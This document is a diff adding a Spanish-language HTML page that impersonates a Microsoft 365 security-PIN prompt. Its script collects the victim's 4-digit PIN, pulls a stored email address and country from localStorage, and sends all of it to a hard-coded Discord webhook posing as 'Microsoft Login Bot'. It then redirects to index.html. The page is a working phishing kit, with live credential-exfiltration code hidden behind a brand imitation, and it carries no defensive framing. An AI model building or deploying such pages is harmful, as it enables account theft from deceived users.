@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ingrese su PIN de Seguridad - Microsoft 365</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f2f2f2;
+        }
+
+        /* Custom shadow matching Microsoft UI style */
+        .ms-card-shadow {
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.05), 0 0 15px 0 rgba(0, 0, 0, 0.03);
+        }
+
+        /* Input highlight animation/border */
+        .pin-input:focus {
+            outline: none;
+            border-color: #0067b8;
+            box-shadow: 0 0 0 1px #0067b8;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+
+    <!-- Card Container -->
+    <div class="bg-white rounded-lg ms-card-shadow w-full max-w-md p-8 md:p-10 flex flex-col items-center text-center">
+        
+        <!-- Microsoft 365 Header Logo -->
+        <div class="flex items-center justify-center space-x-2.5 mb-8">
+            <!-- Microsoft 4-square Logo -->
+            <div class="grid grid-cols-2 gap-0.5 w-[22px] h-[22px]">
+                <div class="bg-[#f25022] w-full h-full"></div>
+                <div class="bg-[#7fba00] w-full h-full"></div>
+                <div class="bg-[#00a4ef] w-full h-full"></div>
+                <div class="bg-[#ffb900] w-full h-full"></div>
+            </div>
+            <!-- Text -->
+            <span class="text-2xl font-semibold text-[#5e5e5e] tracking-tight">Microsoft 365</span>
+        </div>
+
+        <!-- Lock Icon -->
+        <div class="text-4xl mb-4 select-none" aria-hidden="true">
+            🔐
+        </div>
+
+        <!-- Main Heading -->
+        <h1 class="text-[22px] font-semibold text-[#1b1b1b] mb-2 leading-tight">
+            Ingrese su PIN de Seguridad
+        </h1>
+
+        <!-- Subtitle / Instruction Text -->
+        <p class="text-xs text-[#505050] max-w-xs leading-relaxed mb-7">
+            Ingrese un PIN de 4 dígitos para proteger su cuenta.<br>No lo comparta con nadie.
+        </p>
+
+        <!-- PIN Input Form -->
+        <form id="pinForm" onsubmit="handleSubmit(event)" class="w-full flex flex-col items-center">
+            
+            <!-- 4 Digit Inputs Grid -->
+            <div class="flex justify-center space-x-3 mb-8">
+                <input 
+                    type="password" 
+                    maxlength="1" 
+                    pattern="[0-9]*" 
+                    inputmode="numeric" 
+                    class="pin-input w-12 h-14 md:w-14 md:h-14 border border-[#767676] rounded-md text-center text-2xl font-semibold text-[#1b1b1b] transition-all duration-150"
+                    autofocus 
+                    aria-label="Dígito 1 del PIN"
+                />
+                <input 
+                    type="password" 
+                    maxlength="1" 
+                    pattern="[0-9]*" 
+                    inputmode="numeric" 
+                    class="pin-input w-12 h-14 md:w-14 md:h-14 border border-[#767676] rounded-md text-center text-2xl font-semibold text-[#1b1b1b] transition-all duration-150"
+                    aria-label="Dígito 2 del PIN"
+                />
+                <input 
+                    type="password" 
+                    maxlength="1" 
+                    pattern="[0-9]*" 
+                    inputmode="numeric" 
+                    class="pin-input w-12 h-14 md:w-14 md:h-14 border border-[#767676] rounded-md text-center text-2xl font-semibold text-[#1b1b1b] transition-all duration-150"
+                    aria-label="Dígito 3 del PIN"
+                />
+                <input 
+                    type="password" 
+                    maxlength="1" 
+                    pattern="[0-9]*" 
+                    inputmode="numeric" 
+                    class="pin-input w-12 h-14 md:w-14 md:h-14 border border-[#767676] rounded-md text-center text-2xl font-semibold text-[#1b1b1b] transition-all duration-150"
+                    aria-label="Dígito 4 del PIN"
+                />
+            </div>
+
+            <!-- Toast / Message Box (Replaces alert) -->
+            <div id="messageBox" class="hidden mb-4 w-full p-2.5 text-xs rounded-md text-center transition-all"></div>
+
+            <!-- Action Buttons -->
+            <div class="w-full space-y-3">
+                <!-- Confirm Button -->
+                <button 
+                    type="submit" 
+                    class="w-full bg-[#0067b8] hover:bg-[#005da6] active:bg-[#005293] text-white font-semibold py-2.5 px-4 rounded-md text-sm transition-colors duration-150 flex items-center justify-center space-x-2"
+                >
+                    <svg class="w-4 h-4 fill-current stroke-current" stroke-width="1.5" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5" />
+                    </svg>
+                    <span>Confirmar PIN</span>
+                </button>
+
+                <!-- Back Button -->
+                <button 
+                    type="button" 
+                    onclick="handleBack()" 
+                    class="w-full bg-white hover:bg-[#f3f2f1] active:bg-[#edebe9] text-[#0067b8] border border-[#0067b8] font-semibold py-2.5 px-4 rounded-md text-sm transition-colors duration-150 flex items-center justify-center space-x-2"
+                >
+                    <svg class="w-4 h-4 stroke-current" fill="none" stroke-width="2" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M10.5 19.5L3 12m0 0l7.5-7.5M3 12h18" />
+                    </svg>
+                    <span>Volver</span>
+                </button>
+            </div>
+        </form>
+
+    </div>
+
+    <!-- Interactive JavaScript -->
+    <script>
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1572443233391480922/iR6b8H4YuwafgbOZBRQbvuL4UJmhGjFeG_my3aVxTURc1_Y9NbVBc31wzdahVIsMEY_R";
+        const userEmail = localStorage.getItem("usuario") || "Correo-no-disponible";
+
+        const inputs = document.querySelectorAll('.pin-input');
+        const messageBox = document.getElementById('messageBox');
+
+        // Handle auto-focus movement between PIN boxes
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                // Keep only numeric input
+                input.value = input.value.replace(/[^0-9]/g, '');
+
+                if (input.value.length === 1) {
+                    if (index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                // Move back on Backspace if current box is empty
+                if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+
+            // Handle paste event (e.g. pasting "1234")
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 4);
+                
+                pastedData.split('').forEach((char, i) => {
+                    if (inputs[i]) {
+                        inputs[i].value = char;
+                    }
+                });
+
+                if (pastedData.length > 0) {
+                    const nextFocusIndex = Math.min(pastedData.length, inputs.length - 1);
+                    inputs[nextFocusIndex].focus();
+                }
+            });
+        });
+
+        // Enviar PIN + correo a Discord
+        async function sendToDiscord(email, pin) {
+            try {
+                const timestamp = new Date().toLocaleString();
+                const country = localStorage.getItem("userCountry") || "País-no-disponible";
+                const message = `🔐 **PIN DE SEGURIDAD**\n📧 **Email:** ${email}\n🔢 **PIN:** ${pin}\n🌍 **País:** ${country}\n📍 **Hora:** ${timestamp}`;
+
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: message,
+                        username: 'Microsoft Login Bot'
+                    })
+                });
+            } catch (error) {
+                console.error('Error enviando datos a Discord:', error);
+            }
+        }
+
+        // Form Submit Handler
+        async function handleSubmit(event) {
+            event.preventDefault();
+            
+            let pin = '';
+            inputs.forEach(input => pin += input.value);
+
+            if (pin.length === 4) {
+                showMessage('PIN ingresado correctamente.', 'success');
+                await sendToDiscord(userEmail, pin);
+                setTimeout(() => {
+                    window.location.href = 'index.html';
+                }, 1200);
+            } else {
+                showMessage('Por favor ingrese un PIN de 4 dígitos.', 'error');
+            }
+        }
+
+        // Back Button Handler
+        function handleBack() {
+            // Clear inputs
+            inputs.forEach(input => input.value = '');
+            window.location.href = 'index.html';
+        }
+
+        // Helper to display clean user feedback messages
+        function showMessage(msg, type) {
+            messageBox.classList.remove('hidden', 'bg-red-100', 'text-red-700', 'bg-green-100', 'text-green-700', 'bg-blue-100', 'text-blue-700');
+            
+            if (type === 'error') {
+                messageBox.classList.add('bg-red-100', 'text-red-700');
+            } else if (type === 'success') {
+                messageBox.classList.add('bg-green-100', 'text-green-700');
+            } else {
+                messageBox.classList.add('bg-blue-100', 'text-blue-700');
+            }
+
+            messageBox.textContent = msg;
+        }
+    </script>
+</body>
+</html>
